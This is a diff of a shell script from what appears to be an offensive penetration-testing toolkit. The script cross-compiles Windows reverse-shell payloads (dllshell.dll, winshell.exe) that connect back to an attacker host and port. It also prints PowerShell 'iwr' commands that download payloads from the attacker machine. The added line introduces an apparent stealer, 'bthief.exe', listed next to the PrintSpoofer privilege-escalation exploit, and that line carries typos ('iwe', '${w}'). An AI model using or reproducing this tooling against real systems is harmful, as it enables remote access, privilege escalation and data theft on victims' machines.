@@ -52,7 +52,7 @@ compile_payloads() {
     echo -e "${LG}==============================================${W}"
     x86_64-w64-mingw32-gcc $scriptdir/payloads/win/src/dllshell.cpp --shared -o $scriptdir/payloads/win/dllshell.dll -DSERVER_HOST="\"$lhost"\" -DSERVER_PORT="$lport" -DUNICODE -D_UNICODE -DWIN32_LEAN_AND_MEAN -lws2_32
     echo -e "${G}[+]${W} dllshell.dll"
-    
+
     x86_64-w64-mingw32-gcc $scriptdir/payloads/win/src/winshell.c -o $scriptdir/payloads/win/winshell.exe -DSERVER_HOST="\"$lhost"\" -DSERVER_PORT="$lport" -DUNICODE -D_UNICODE -DWIN32_LEAN_AND_MEAN -lws2_32 -w
     echo -e "${G}[+]${W} winshell.exe"
 
@@ -172,6 +172,7 @@ list_payloads()
     echo -e "iwr -uri http://$lhost/payloads/win/methttps.exe -OutFile ${G}methttps.exe${W}"
     echo -e "iwr -uri http://$lhost/payloads/win/rs_service.exe -OutFile ${G}rs_service.exe${W}"
     echo ""
+    echo -e "iwe -uri http://$lhost/payloads/win/bthief.exe -OutFile ${G}bthief.exe${w}"
     echo -e "iwr -uri http://$lhost/exploits/win/PrintSpoofer64.exe -OutFile ${G}PrintSpoofer64.exe${W}"
     echo ""
     echo ""
